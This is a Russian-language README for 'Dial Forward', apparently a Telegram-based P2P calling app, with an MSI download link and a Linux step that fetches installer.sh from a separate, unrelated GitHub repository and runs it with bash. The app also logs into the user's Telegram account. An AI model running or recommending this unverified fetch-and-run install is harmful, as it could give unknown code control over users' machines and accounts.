# Dial Forward

**Dial Forward** — P2P-приложение для голосовых и видеозвонков через Telegram. Медиа передаётся напрямую между собеседниками (WebRTC), общедоступные каналы Telegram используются только для сигналинга и передачи реле.

## Системные требования

| Платформа | Требования |
|-----------|------------|
| Windows 10/11 (x64) | Нет сторонних зависимостей — всё поставляется в установщике |
| Linux (x64) | `bash`, `python3` (≥ 3.9), `python3-venv`, `python3-pip`, GStreamer (см. installer.sh) |

## Установка

### Windows (рекомендуется)

Скачайте и запустите установщик — MSI поставит приложение со всеми зависимостями автоматически (без необходимости устанавливать Python или GStreamer вручную):

- **Последняя версия:** [DialForward.msi](https://github.com/123asxcqasdc/dial-forwrd/releases/latest/download/DialForward.msi)

После установки доступен ярлык **Dial Forward**, а также [installer.bat](installer.bat) для обновления.

### Linux

```bash
curl -fsSL https://raw.githubusercontent.com/123asxcqasdc/uliigra2/main/dial-forward/installer.sh -o installer.sh
bash installer.sh
```

## Как это работает

1. Приложение запускает локальный реле-сервер (реализация Telegram-клиента), который подключается к вашему аккаунту.
2. Для звонка передаётся SDP-оффер через Telegram-сообщение.
3. После обмена сигнальными данными устанавливается **прямое WebRTC-соединение** между собеседниками, и медиа идёт напрямую (P2P), не через серверы Telegram.
4. Если прямое соединение невозможно (NAT/файрвол), используется автоматический релейный механизм.

## Возможности

- Голосовые и видеозвонки P2P
- Единый вход через аккаунт Telegram (QR-код)
- Индикатор подключения
- Автообновление с кнопкой «Обновить приложение»
- Автозапуск при входе в систему
- Инсталляция одним MSI-пакетом (Windows)
